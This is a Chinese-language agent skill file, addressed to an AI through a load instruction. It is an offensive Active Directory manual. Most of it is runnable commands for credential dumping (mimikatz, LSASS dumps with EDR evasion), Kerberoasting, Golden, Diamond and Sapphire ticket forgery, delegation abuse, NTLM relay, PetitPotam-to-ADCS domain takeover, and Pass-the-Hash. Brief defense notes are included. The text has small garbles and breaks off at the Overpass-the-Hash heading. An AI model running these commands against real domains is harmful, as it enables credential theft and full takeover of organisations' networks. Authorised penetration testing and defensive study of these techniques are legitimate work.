---
name: active-directory-lateral-movement
description: >-
  Active Directory 内网渗透与横向移动深度手册。覆盖域信息侦察(BloodHound/PowerView/ADModule)、Kerberos攻击矩阵(AS-REP Roasting/Kerberoasting/Golden/Silver/Diamond/Sapphire Ticket/S4U委派)、NTLM中继(ntlmrelayx/PetitPotam/cross-protocol)、凭据传递(Pass-the-Hash/Pass-the-Ticket/Overpass-the-Hash)、横向移动(WMI/PsExec/WinRM/DCOM)、ACL滥用与DCSync、ADCS证书服务攻击(ESC1-8/Shadow Credentials)、2026最新技术(noPac/KrbRelayUp/CVE-2022-26923)、检测防御与自动化SOP。用于内网渗透、域控接管、横向移动评估场景。
---

# SKILL: Active Directory 内网渗透与横向移动 — 深度手册

> **AI LOAD INSTRUCTION**: 本技能聚焦 Windows Active Directory 域环境下的内网渗透全生命周期。基础模型常把"内网渗透"与"外网Web测试"混为一谈，本技能澄清：AD渗透的核心是**身份与信任关系**的滥用——Kerberos票据、NTLM哈希、委派配置、ACL继承构成攻击图。覆盖从域信息侦察(BloodHound图分析)、凭据获取(AS-REP/Kerberoasting/密码喷洒)、票据伪造(Golden/Silver/Diamond/Sapphire)、NTLM中继(PetitPotam触发)、横向移动(WMI/PsExec/WinRM/DCOM)、权限提升(DCSync/ACL滥用)、ADCS证书攻击(ESC1-8)到2026最新技术(noPac/KrbRelayUp)的完整链条，给出自动化SOP与检测防御矩阵。

## 0. RELATED ROUTING

- [network-penetration-testing](../network-penetration-testing/SKILL.md) — 外网网络渗透，AD渗透是其内网延伸
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) — 暴露服务(SMB/RDP/WinRM)的未授权访问，常为AD渗透初始入口
- [auth-sec](../auth-sec/SKILL.md) — 认证安全，Kerberos/NTLM是AD认证协议
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) — Token攻击方法论，与AD票据攻击思维相通

---

## 1. 核心概念与攻击生命周期

Active Directory 是 Windows 域环境的目录服务，存储用户、计算机、组、服务、策略等对象，并通过 Kerberos/NTLM/LDAP 提供认证与授权。AD 渗透的本质是**身份与信任链的横向滥用**——攻击者获取一个低权限凭据后，沿信任关系逐层攀升至域管理员(Domain Admin)，最终控制域控(DC)接管全域。

### 1.1 AD 核心对象与信任概念

| 概念 | 说明 | 攻击相关性 |
|------|------|-----------|
| Domain Controller (DC) | 运行AD DS的服务器，存储NTDS.dit域数据库 | 最终目标，含所有NTLM哈希 |
| NTDS.dit | DC上的域数据库文件，存储所有用户哈希 | 拿下DC后导出即获全域哈希 |
| krbtgt 账户 | DC上签发TGT的特殊账户，其哈希用于签名所有TGT | Golden Ticket的核心——拿到krbgt哈希可伪造任意TGT |
| TGT (Ticket Granting Ticket) | Kerberos第一步票据，向KDC证明身份 | 伪造TGT=Golden Ticket |
| TGS (Ticket Granting Service) | Kerberos服务票据，访问具体服务用 | Kerberoasting的核心——离线爆破TGS |
| SPN (Service Principal Name) | 服务与账户的映射标识 | Kerberoasting需先定位有SPN的账户 |
| 委派 (Delegation) | 允许服务代表用户访问其他服务 | 非约束/约束/基于资源的委派三类滥用 |
| SID History | 账户历史SID，跨域迁移保留 | 注入高权限SID=权限提升 |
| DCSync | 通过DRSUAPI模拟DC同步复制 | 拉取任意账户哈希(含krbgt)，无需登录DC |

### 1.2 AD 渗透攻击生命周期

```
外网初始立足 (Phishing/Web漏洞/暴露服务)
   │
   ▼
[1] 域信息侦察 ─── BloodHound图分析/PowerView枚举/ADModule查询
   │  定位高价值账户、委派配置、ACL路径、域控位置
   ▼
[2] 初始凭据获取 ─── AS-REP Roasting(无需凭据)/密码喷洒/Kerberoasting/本地凭据提取
   │  获得首批可用凭据(明文密码/NTLM哈希/票据)
   ▼
[3] 横向移动 ─── Pass-the-Hash/Pass-the-Ticket/WMI/PsExec/WinRM/DCOM
   │  在主机间移动，扩大控制面，搜集更多凭据
   ▼
[4] 权限提升 ─── ACL滥用(ForceChangePassword/GenericAll)/委派攻击/ADCS ESC
   │  从普通域用户攀升至高权限(如DNS Admins/Server Operators)
   ▼
[5] 域控接管 ─── DCSync拉取krbgt/Golden Ticket/PetitPotam+ADCS/S4U2Self滥用
   │  获得Domain Admin等效权限
   ▼
[6] 持久化与全域控制 ─── Golden/Silver Ticket/Diamond Ticket/SID History/DCShadow
   │  铸造伪造票据，绕过密码修改，建立长期后门
   ▼
[7] 跨域/跨林移动 ─── 信任关系滥用/ SID Filtering绕过
```

### 1.3 关键判断：是否在域环境

渗透进入一台 Windows 主机后，首要判断其是否加入域及域信息：

```powershell
# 1. 判断是否加域
systeminfo | findstr /B "Domain"          # DOMAIN: corp.local 则加域
echo %USERDOMAIN%                          # 当前用户域
echo %LOGONSERVER%                         # 登录的DC主机名

# 2. 查询域基本信息
nltest /dclist:corp.local                  # 列出所有域控
nltest /domain_trusts                      # 域信任关系
net group "domain admins" /domain          # 域管组成员
net user /domain                           # 域用户列表

# 3. 判断当前权限与票据
whoami /groups                             # 当前用户所属组(含SID)
whoami /priv                               # 当前特权
klist                                      # 当前持有的Kerberos票据
```

> **要点**：拿到shell后第一件事是 `whoami /all` + `klist` + 判断域。这是后续所有攻击路径选择的依据。

---

## 2. 域信息侦察与枚举

AD 渗透的胜负往往取决于侦察的深度。BloodHound 将域内对象关系可视化为攻击图，是侦察的核心工具。

### 2.1 BloodHound：攻击图分析

BloodHound 用图数据库(Neo4j)存储域对象及其关系(成员关系/ACL/会话/委派)，自动计算从当前立足点到Domain Admin的最短攻击路径。

```bash
# 1. 启动Neo4j与BloodHound (Kali)
neo4j start                                # 启动图数据库
bloodhound                                 # 启动Web界面 http://localhost:7474

# 2. 数据采集 — SharpHound (C#收集器，最常用)
# 在域内主机执行，采集会话/ACL/对象/委派/ADCS等全量数据
SharpHound.exe -c All                      # 全量采集(会话+ACL+对象+GPO+委派+证书)
SharpHound.exe -c Session --loop           # 仅采集会话(循环，提高命中率)
SharpHound.exe -c ACL --collectionmethod Session  # 组合采集

# 3. 上传zip到BloodHound，运行预置查询
#   - Find All Domain Admins               列出所有域管
#   - Shortest Paths to Domain Admins      到域管的最短路径(核心)
#   - Find Kerberoastable Users            可Kerberoasting的账户
#   - Find AS-REP Roastable Users          可AS-REP Roasting的账户
#   - Find Principals with DCSync Rights   有DCSync权限的账户
#   - List All Kerberos Delegations        所有委派配置
```

**BloodHound攻击路径解读**——图中的边(Edge)代表可利用的信任关系：

| 边(Edge)类型 | 含义 | 利用方式 |
|-------------|------|---------|
| `MemberOf` | 账户属于某组 | 继承组权限 |
| `HasSession` | 用户在某主机有登录会话 | 攻击该主机提取用户凭据 |
| `AdminTo` | 账户对主机有管理员权限 | 可远程执行/提权 |
| `GenericAll` | 对对象有完全控制 | 可改密码/改ACL/加组成员 |
| `GenericWrite` | 可写对象属性 | 可改SPN(触发Kerberoasting)/改scriptPath |
| `ForceChangePassword` | 可强制改密码 | 直接重置目标密码 |
| `AllowedToDelegate` | 配置了约束委派 | S4U2Self/S4U2Proxy滥用 |
| `GetChangesAll` | 有DCSync复制权限 | 直接拉取全域哈希 |

### 2.2 PowerView：命令行枚举

PowerView 是 PowerShell 域枚举神器，适合无 BloodHound 界面时的快速查询：

```powershell
# 域基本信息
Get-Domain                                  # 当前域信息
Get-DomainController                        # 域控列表
Get-DomainUser -IdentityAdministrator       # 管理员账户

# 高价值账户定位
Get-DomainUser -PreauthNotRequired          # AS-REP Roasting候选(未启用预认证)
Get-DomainUser -SPN                         # Kerberoasting候选(有SPN)
Get-DomainUser -AllowDelegation             # 可被委派的用户

# 组与权限
Get-DomainGroup -AdminCount                 # AdminCount=1的高权限组
Get-DomainGroupMember -Identity "Domain Admins"  # 域管成员
Get-NetGroupMember -GroupName "Domain Admins" -Recurse  # 递归(含嵌套组)

# 主机与会话
Get-NetComputer -OperatingSystem "Windows Server*"  # 所有服务器
Get-NetSession -ComputerName fileserver01   # 某主机的登录会话(定位域管在哪登录)
Find-DomainShare -CheckShareAccess          # 可访问的共享

# ACL查询
Get-ObjectAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -eq "GenericAll"}  # 所有GenericAll
Find-InterestingDomainAcl                   # 异常ACL(可能有提权路径)

# 委派
Get-DomainComputer -TrustedToAuth           # 非约束委派的主机
Get-DomainUser -TrustedToAuth               # 约束委派的用户
```

### 2.3 ADModule 与原生工具

企业环境常受限 PowerShell Constrained Language Mode 或无 PowerView，此时用 ActiveDirectory 模块与原生 net 命令：

```powershell
# AD模块(需RSAT，部分环境预装)
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties ServicePrincipalName | ?{$_.ServicePrincipalName}  # Kerberoasting候选
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}                                 # AS-REP候选
Get-ADComputer -Filter * -Properties OperatingSystem                                 # 所有计算机
Get-ADGroupMember "Domain Admins" -Recursive                                          # 域管递归

# 原生net命令(最受限环境也可用)
net user /domain                              # 域用户
net group "domain admins" /domain             # 域管
net group "domain controllers" /domain        # 域控
nltest /dclist:corp.local                     # DC列表
```

### 2.4 ADSI/LDAP 查询

最底层方式，通过 LDAP 直接查询 AD 目录，绕过 PowerShell 限制：

```powershell
# 通过ADSI搜索所有用户
$searcher = New-Object System.DirectoryServices.DirectorySearcher(
    [ADSI]"LDAP://DC=corp,DC=local")
$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"  # 有SPN的用户
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# 查询未启用预认证的用户
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
# UAC位 4194304 = DONT_REQ_PREAUTH

# ldapsearch (Linux/Kali)
ldapsearch -x -H ldap://dc01.corp.local -D 'user@corp.local' -w 'Pass123!' \
  -b 'DC=corp,DC=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
```

---

## 3. 初始立足与凭据获取

进入域内后的第一目标是获取**可用的域凭据**——明文密码、NTLM哈希或Kerberos票据。两类无需任何凭据即可发起的攻击：AS-REP Roasting 与密码喷洒。

### 3.1 AS-REP Roasting

针对**未启用预认证(Pre-Authentication)**的账户。Kerberos正常流程中，客户端先用密码生成预认证数据证明身份才换取TGT；若账户关闭预认证(`DONT_REQ_PREAUTH`)，攻击者只需知道用户名即可请求TGT，TGT中含用该用户密码哈希加密的 AS-REP 部分，可离线爆破。

```bash
# 1. 定位未启用预认证的账户(PowerView)
Get-DomainUser -PreauthNotRequired | select samaccountname

# 2. 请求AS-REP并提取可爆破哈希 (impacket GetNPUsers)
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip 10.0.0.1
# 无密码即可请求，输出hashcat可爆破格式

# 3. Rubeus (Windows内)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 4. 离线爆破
hashcat -m 18200 asrep.txt rockyou.txt        # 18200 = Kerberos AS-REP
```

> **要点**：AS-REP Roasting **无需任何凭据**，仅需有效用户名列表。防御：确保所有账户启用预认证。

### 3.2 密码喷洒 (Password Spraying)

用一个常见弱密码(如 `Spring2024!`)对所有用户尝试登录一次，规避账户锁定策略。相比爆破单账户，密码喷洒每账户仅试一次，不触发锁定。

```bash
# impacket rpcdump 检测是否锁定策略
rpcclient -U "" -N 10.0.0.1 -c "getdompwinfo"   # 查看密码策略(lockout threshold)

# 密码喷洒
for user in $(cat users.txt); do
  ntlmrelayx 无关... # 用 kerbrute 更合适
done

# kerbrute (基于Kerberos预认证，不触发常规日志)
kerbrute passwordspray -d corp.local users.txt 'Spring2024!' --dc 10.0.0.1

# spray (SmartHash模式，按策略控制速率)
python3 spray.py -d corp.local -u users.txt -p 'Spring2024!' -s 1
# -s 1 每用户间隔，避免锁定
```

**密码喷洒策略要点**：
- 先查锁定阈值(`lockoutThreshold`)，通常5次，则每账户每天最多试4个密码
- 锁定观察期(`lockoutObservationWindow`)决定何时可再试
- 选季节性密码 `Season+Year+!` 命中率高(如 `Winter2025!`)
- Kerbrute基于Kerberos，产生的4771日志比SMB登录少

### 3.3 Kerberoasting

针对**有SPN的服务账户**。任何域用户都可请求某SPN的TGS票据，TGS用该服务账户的密码哈希加密，可离线爆破。这是**用普通域用户权限换取高权限服务账户密码**的经典攻击。

```bash
# 1. 定位有SPN的账户
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# 2. 请求所有TGS票据 (impacket GetUserSPNs)
GetUserSPNs.py corp.local/user:Pass123! -dc-ip 10.0.0.1 -request
# -request 请求所有TGS，输出hashcat格式

# 3. Rubeus (Windows)
Rubeus.exe kerberoast /outfile:tgs.txt /nowrap

# 4. 离线爆破 (服务账户密码常较长较强，需GPU)
hashcat -m 13100 tgs.txt rockyou.txt        # 13100 = Kerberos TGS (RC4)
hashcat -m 19700 tgs.txt rockyou.txt        # 19700 = Kerberos TGS (AES128)
hashcat -m 19800 tgs.txt rockyou.txt        # 19800 = Kerberos TGS (AES256)
```

**Kerberoasting成功要素**：
- 目标服务账户密码**弱**(常为部署时设的弱密码，运维遗忘修改)
- 优先 RC4-HMAC 加密的TGS(RC4爆破远快于AES)
- 攻击**只需普通域用户**，无需特殊权限，产生的4769日志易被海量正常TGS请求淹没

### 3.4 本地凭据提取

拿到主机管理员权限后，从内存与磁盘提取缓存的凭据：

```bash
# 1. LSASS内存转储 (含明文密码/NTLM哈希/Kerberos票据)
# Mimikatz (经典)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords        # 提取登录密码/哈希
mimikatz # sekurlsa::tickets               # 提取Kerberos票据
mimikatz # lsadump::sam                    # 提取本地SAM哈希
mimikatz # lsadump::dcsync /user:krbtgt    # DCSync拉取(需权限)

# 2. 免杀方式转储LSASS (绕过EDR)
procdump -ma lsass.exe lsass.dmp            # 微软官方procdump，签名
comsvcs.dll MiniDump (通过rundll32)         # 系统自带DLL
nanodump / comsvcs / lsassy                 # 新一代免杀dump工具

# 3. 离线解析dump
pypykatz lsa minidump lsass.dmp             # 纯Python解析mimikatz格式
lsassy -d corp.local -u user -p Pass /10.0.0.5  # 远程dump+解析一条龙

# 4. 其他凭据位置
reg save HKLM\SAM sam.hive                  # SAM数据库(本地账户哈希)
reg save HKLM\SECURITY security.hive        # 缓存的域凭据
reg save HKLM\SYSTEM system.hive            # 解密密钥
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL
```

> **要点**：LSASS是凭据金矿。现代EDR重点监控LSASS访问，需用签名工具(procdump)或间接方式(comsvcs)绕过。见 `sinian-omnipotent` 域A免杀技术。

---

## 4. Kerberos 攻击矩阵

Kerberos 是 AD 的核心认证协议，理解其票据流转是 AD 渗透的灵魂。本节覆盖从离线爆破到票据伪造的完整攻击矩阵。

### 4.1 Kerberos 协议流程回顾

```
客户端                        KDC(域控)                    服务服务器
  │                            │                              │
  │── AS-REQ (用户名+预认证)──>│                              │
  │                            │  用用户密码哈希校验预认证      │
  │<── AS-REP (TGT+会话密钥)──│  TGT用krbtgt哈希签名           │
  │  ★ 此时拿到TGT                                            │
  │                            │                              │
  │── TGS-REQ (TGT+要访问的SPN)─>│                            │
  │                            │  用krbtgt哈希验TGT            │
  │<── TGS-REP (TGS票据)──────│  TGS用服务账户哈希加密         │
  │  ★ 此时拿到TGS                                            │
  │                            │                              │
  │── 服务请求 (TGS票据)──────────────────────────────────────>│
  │                            │  用服务账户哈希解TGS验签       │
  │<── 服务响应────────────────────────────────────────────────│
```

**攻击面映射**：
- AS-REQ/AS-REP 阶段 → AS-REP Roasting(关闭预认证)/密码喷洒(预认证爆破)
- TGS-REQ/TGS-REP 阶段 → Kerberoasting(离线爆破TGS)
- TGT 伪造 → Golden Ticket(用krbtgt哈希)/Diamond/Sapphire Ticket
- TGS 伪造 → Silver Ticket(用服务账户哈希)
- 委派流程 → S4U2Self/S4U2Proxy 滥用

### 4.2 Golden Ticket

拿到 **krbtgt 账户哈希**后，可伪造任意用户的 TGT。由于 TGT 仅由 krbtgt 哈希签名验证，DC 不会校验该用户是否真实存在或密码是否正确，因此伪造的 TGT 可访问全域任何服务，且**即使真实用户改密码仍有效**(直到krbtgt密码轮换，通常两次轮换才彻底失效)。

```bash
# 1. 获取krbtgt哈希 (DCSync)
secretsdump.py corp.local/Administrator:Pass@10.0.0.1 | grep krbtgt
# 或 mimikatz: lsadump::dcsync /user:corp\krbtgt

# 2. 铸造Golden Ticket (mimikatz)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-xxx /krbtgt:<NTLM哈希> /ptt
# /user 可填任意(甚至不存在的)用户名
# /ptt 立即注入内存(Pass-the-Ticket)，也可导出文件
# 可加 /id:500 /groups:512 强制Domain Admin SID

# 3. impacket ticketer (Linux)
ticketer.py -nthash <krbtgt哈希> -domain-sid S-1-5-21-xxx -domain corp.local Administrator
# 生成ccache票据，设置KRB5CCNAME环境变量使用

# 4. 使用伪造TGT访问服务
export KRB5CCNAME=Administrator.ccache
psexec.py -k corp.local/Administrator@dc01.corp.local    # 无需密码直接横向
smbexec.py -k corp.local/Administrator@fileserver01
```

**Golden Ticket特征**：
- 有效期默认10年(可自定义)，krbtgt哈希不变则长期有效
- 可伪造任意用户身份，包括不存在的账户
- 注入高权限SID即可获得Domain Admin
- **防御**：定期轮换krbtgt密码(需两次，因保留旧哈希)，监控异常TGT(超长有效期/异常SID History)

### 4.3 Silver Ticket

拿到**服务账户哈希**后，直接伪造该服务的 TGS 票据。与 Golden Ticket 不同，Silver Ticket 不经过 KDC，因此不产生 TGS 请求日志，更隐蔽，但仅限访问该特定服务。

```bash
# 1. 获取服务账户哈希 (如CIFS服务的计算机账户哈希)
secretsdump.py corp.local/user:Pass@10.0.0.5   # 拿目标主机本地SAM

# 2. 铸造Silver Ticket (伪造CIFS服务票据，访问文件共享)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-xxx /target:fileserver01.corp.local /service:cifs \
  /rc4:<服务账户NTLM哈希> /ptt

# 3. 直接访问 (无需与DC交互)
dir \\fileserver01.corp.local\c$
```

**Silver vs Golden 对比**：

| 维度 | Golden Ticket | Silver Ticket |
|------|--------------|---------------|
| 伪造票据 | TGT | TGS |
| 所需哈希 | krbtgt | 服务账户 |
| 影响范围 | 全域所有服务 | 单一服务 |
| 是否经过KDC | 是(请求时) | 否(直接伪造TGS) |
| 隐蔽性 | 中(有TGS日志) | 高(无KDC交互日志) |
| 失效条件 | krbtgt密码轮换两次 | 服务账户密码修改 |

### 4.4 Diamond Ticket (2021)

传统 Golden Ticket 的 TGT 是完全伪造的，特征明显(无真实 PAC、有效期异常)。Diamond Ticket 是**修改真实 TGT**——先合法获取一个普通用户的 TGT，再用 krbtgt 哈希**解密、修改 PAC(注入Domain Admin等高权限组SID)、重新加密**，保留真实票据结构，规避 PAC 验证检测。

```bash
# Rubeus 铸造Diamond Ticket
Rubeus.exe diamond /krbkey:<krbtgt AES密钥> /user:lowprivuser \
  /password:Pass123! /domain:corp.local /dc:dc01.corp.local \
  /ticketuser:Administrator /ticketuserid:500 /groups:512

# 原理：合法获取lowprivuser的TGT → 用krbkey解密 → 替换PAC中的用户名/SID/组 → 重加密
# 结果：票据看起来像DC正常签发，但PAC内是Administrator权限
```

> **要点**：Diamond Ticket 解决 Golden Ticket "完全伪造易被PAC校验发现"的问题，是2021年后的隐蔽票据伪造技术。防御：启用PAC签名校验(KB5008383)。

### 4.5 Sapphire Ticket (2022)

Sapphire Ticket 是 Diamond 的进化版——通过 **S4U2Self** 让 DC **合法地**为目标用户(如Administrator)生成 PAC，再结合 krbtgt 哈希重加密，使 PAC 完全由 DC 生成而非攻击者伪造，进一步规避 PAC 异常检测。

```bash
# 原理：利用约束委派的S4U2Self，让DC为Administrator生成合法PAC
# 再用krbtgt密钥把PAC装进攻击者控制的TGT
# PAC是DC"亲笔签发"的，任何PAC校验都无法区分

# 需要一个配置了约束委派到自身或特定服务的账户
Rubeus.exe sapphire /krbkey:<krbgt密钥> /user:deleguser /password:Pass \
  /domain:corp.local /dc:dc01.corp.local /impersonate:Administrator /targetservice:cifs
```

### 4.6 委派攻击

AD 委派允许服务代表用户访问其他服务，是横向移动与提权的重要路径。三类委派：

**非约束委派 (Unconstrained Delegation)**——最危险，服务可代表任何用户访问任何服务：

```powershell
# 1. 查找非约束委派的主机
Get-DomainComputer -Unconstrained
# 或 BloodHound: Find Computers with Unconstrained Delegation

# 2. 若DC配置了非约束委派(罕见但致命)，配合PrinterBug强制DC认证
# SpoolSample触发DC向攻击者主机认证 → 捕获DC的TGT → 横向到任意服务
SpoolSample dc01.corp.local attacker.corp.local   # 触发DC认证
# 同时在attacker主机用Rubeus监听
Rubeus.exe monitor /interval:5 /filteruser:DC01$  # 捕获DC$的TGT
# 拿到DC$的TGT → 用它访问任意服务(DC代表自己认证过)
```

**约束委派 (Constrained Delegation)**——限制只能代表用户访问特定服务：

```bash
# 利用S4U2Self + S4U2Proxy 代表任意用户访问委派允许的服务
# S4U2Self: 服务代表用户向自己请求TGS(获取用户身份)
# S4U2Proxy: 用上一步票据换取目标服务的TGS

# Rubeus 完整委派攻击
Rubeus.exe s4u /user:webservice$ /rc4:<计算机账户哈希> \
  /impersonateuser:Administrator /msdsspn:cifs/fileserver01.corp.local \
  /ptt
# webservice$ 配置了到fileserver01 CIFS的约束委派
# 结果: 获得Administrator访问fileserver01 CIFS的TGS → dir \\fileserver01\c$

# 若目标服务允许委派到任意SPN(配置时用服务类而非完整SPN)，可替换SPN扩展攻击面
```

**基于资源的约束委派 (RBCD, Resource-Based Constrained Delegation)**——2012引入，由**资源方**指定谁可委派到它。若攻击者对某计算机账户有 `WriteAccountRestrictions` 权限，可将自己控制的机器设为该资源的委派方，进而以任意用户身份访问该资源。

```bash
# 1. 查找对目标有WriteAccountRestrictions权限的账户(PowerView)
Find-InterestingDomainAcl | ?{$_.ObjectAceType -eq "WriteAccountRestrictions"}

# 2. 攻击者控制一台机器账户(或新建，需MachineAccountQuota>0，默认10)
# 用powermad新建机器账户
New-MachineAccount -MachineAccount evil$ -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)

# 3. 设置RBCD：让evil$可委派到目标target$
Set-DomainObject -Identity target$ -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=@($SD)}
# 或用rbcd.py
rbcd.py -f evil -t target -action write corp.local/user:Pass

# 4. S4U滥用：以Administrator身份访问target$
Rubeus.exe s4u /user:evil$ /rc4:<evil$哈希> /impersonateuser:Administrator \
  /msdsspn:cifs/target.corp.local /ptt
```

> **要点**：RBCD 是 2019 年后最流行的本地提权之一——普通域用户凭借默认 `MachineAccountQuota` 即可新建机器账户，若对某高权限主机有 `WriteAccountRestrictions` 即可提权到该主机的 SYSTEM。防御：限制 MachineAccountQuota、监控 msDS-AllowedToActOnBehalfOfOtherIdentity 修改。

---

## 5. NTLM 中继攻击

NTLM 中继(NTLM Relay)是 AD 渗透中**无需破解哈希即可横向移动**的关键技术——攻击者截获客户端的 NTLM 认证流，将其"中继"(转发)到目标服务，冒充该客户端通过认证。与 Pass-the-Hash 不同，中继不接触哈希本身，而是实时转发认证协商。

### 5.1 NTLM 认证流程与中继点

```
客户端            攻击者(中继)             目标服务
  │                  │                       │
  │──协商──────────>│                       │
  │<──Challenge──────│──协商──────────────>│
  │                  │<──Challenge──────────│
  │──Response(用密码哈希加密Challenge)─>│──Response(原样转发)──>│
  │                  │                       │  用客户端密码哈希验签
  │                  │<──认证成功────────────│
  │<──结果──────────│                       │
  ★ 攻击者以客户端身份通过目标服务认证
```

**中继成功的前提**：
- 目标服务**未启用签名**(SMB签名/LDAP签名)——签名会绑定到特定会话，中继后签名校验失败
- 客户端与目标服务账户不同(否则中继无意义)
- 攻击者能诱导客户端向自己发起 NTLM 认证

### 5.2 ntlmrelayx 核心用法

impacket 的 ntlmrelayx 是中继攻击的标准工具：

```bash
# 1. 基础SMB中继：将捕获的认证转发到目标SMB，dump SAM哈希
ntlmrelayx.py -t smb://10.0.0.10 -smb2support
# 同时用responder诱导客户端认证(见5.3)

# 2. 中继到LDAP：修改目标对象(如改密码/加用户/启用账户)
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user lowpriv
# --escalate-user 将lowpriv提升到Domain Admins(需目标对LDAP有写权限)

# 3. 中继到LDAPS(签名通常强制开启，但部分环境LDAPS未强制)
ntlmrelayx.py -t ldaps://dc01.corp.local

# 4. 中继到HTTP(RDP/Web服务)
ntlmrelayx.py -t http://webapp.corp.local --http-port

# 5. 多目标轮询(单目标失败自动切换)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# -socks 保持会话，建立socks代理持续利用
```

### 5.3 触发 NTLM 认证(诱导)

中继需要客户端主动发起 NTLM 认证。多种诱导方式：

```bash
# 1. Responder — LLMNR/NBNS/MDNS 投毒
# 当客户端解析失败(如访问不存在的\\fileshare)，Responder伪造响应指向自己
responder -I eth0 -wrf
# 客户端尝试SMB认证到攻击者 → ntlmrelayx接收中继

# 2. PrinterBug (SpoolSample) — 强制域内主机向攻击者认证
# 需目标启用Print Spooler(默认)
python3 SpoolSample.py dc01.corp.local attacker.corp.local
# DC被迫向attacker认证 → 捕获DC$的认证 → 中继

# 3. PetitPotam — 利用MS-EFSRPC强制认证(无需凭据)
python3 PetitPotam.py attacker.corp.local dc01.corp.local
# 强制DC向attacker发起NTLM认证 → 中继到LDAP(见5.5)

# 4. 网页嵌入UNC/SMB链接(钓鱼)
# 邮件/网页中嵌入 <img src="\\attacker\test"> 触发Outlook/浏览器SMB认证

# 5. WPAD 伪造
# Responder的-w参数伪造WPAD自动代理 → 浏览器发认证
```

### 5.4 跨协议中继

NTLM 中继可跨协议——SMB 捕获的认证可中继到 LDAP/HTTP/SMTP 等，前提是目标协议未强制签名：

| 捕获源协议 | 中继目标协议 | 用途 |
|-----------|-------------|------|
| SMB | SMB | dump SAM/执行(需签名关闭) |
| SMB | LDAP | 改对象/提权(LDAP签名未强制时) |
| HTTP | LDAP | Web认证→域对象修改 |
| SMB | LDAPS | LDAPS签名通常关闭(2024前)，可绕过 |
| HTTP | HTTP | 跨Web应用认证 |

**关键防御与绕过**：
- **SMB签名**：域控默认开启，成员服务器可配置。签名开启则SMB→SMB中继失败
- **LDAP签名**：2020前默认关闭，2020后微软推动强制开启(KB)但大量环境未部署
- **Channel Binding(通道绑定)**：将NTLM绑定到TLS通道，防跨协议中继。需服务支持EPA(扩展保护认证)

### 5.5 PetitPotam → ADCS → 域控接管

2021年最热的攻击链——PetitPotam 强制 DC 向攻击者发起 NTLM 认证，中继到 ADCS 证书服务申请证书，用证书进行 Kerberos PKINIT 认证，最终以 DC$ 身份 DCSync 接管全域。

```bash
# 完整攻击链：
# 1. PetitPotam 触发DC认证
python3 PetitPotam.py attacker.corp.local dc01.corp.local

# 2. ntlmrelayx 中继DC认证到ADCS的HTTP证书申请接口
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 3. 获得DC$的证书(base64 PKCS12)
# 用证书进行PKINIT Kerberos认证，获取DC$的TGT
python3 PKINITtools.py corp.local/dc01\$ -cert-pfx dc.pfx -dc-ip 10.0.0.1

# 4. 用DC$的TGT进行DCSync
secretsdump.py -k -no-pass corp.local/dc01\$@dc01.corp.local
# 拿到krbtgt哈希 → Golden Ticket → 全域控制
```

> **要点**：PetitPotam+ADCS 是 2021年破坏力最强的攻击链之一，**无需任何初始凭据**即可从零接管域控。防御：强制LDAP签名+Channel Binding、关闭ADCS HTTP接口、打补丁KB5005413。

---

## 6. 凭据传递与横向移动

拿到 NTLM 哈希或 Kerberos 票据后，无需破解明文密码即可横向移动。这是 AD 内网渗透的核心能力。

### 6.1 Pass-the-Hash (PtH)

NTLM 认证中，客户端用**密码哈希**(NTLM hash)加密 Challenge，因此只要拥有哈希即可完成认证，无需明文密码。PtH 用哈希直接通过 SMB/WinRM/WMI 认证到目标。

```bash
# impacket psexec (SMB执行，返回交互式shell)
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:NTLM哈希 corp.local/Administrator@10.0.0.10
# aad3b...是空LM哈希占位

# wmiexec (WMI执行，更隐蔽，无服务残留)
wmiexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10

# smbexec (SMB执行)
smbexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10

# atexec (计划任务执行)
atexec.py -hashes :NTLM哈希 corp.local/Administrator@10.0.0.10 "whoami"

# CrackMapExec / NetExec (批量)
nxc smb 10.0.0.0/24 -u Administrator -H NTLM哈希 --shares
nxc smb 10.0.0.0/24 -u Administrator -H NTLM哈希 -x "whoami"   # 批量执行命令

# Mimikatz (Windows内)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
  /ntlm:NTLM哈希 /run:cmd.exe
# 注入哈希后新进程以该身份运行
```

**PtH限制**：
- 仅适用于 NTLM 认证的服务(SMB/WMI/WinRM部分)
- Kerberos 认证的服务(默认Windows新版本)PtH失效，需 Overpass-the-Hash
- 本地账户(非域账户)在跨主机时受 LocalAccountTokenFilterPolicy 限制，需注册表放行

### 6.2 Pass-the-Ticket (PtT)

用 Kerberos 票据(TGT/TGS)直接注入内存认证，无需密码或哈希。适用于 Kerberos 认证场景。

```bash
# Mimikatz 注入票据
mimikatz # kerberos::ptt ticket.kirbi      # 注入.kirbi票据
# 注入后可直接访问对应服务: dir \\server\c$

# Rubeus
Rubeus.exe ptt /ticket:base64ticket

# impacket (Linux，用ccache)
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass corp.local/user@server.corp.local
smbclient.py -k -no-pass corp.local/user@server.corp.local
```

### 6.3 Overpass-the-Hash

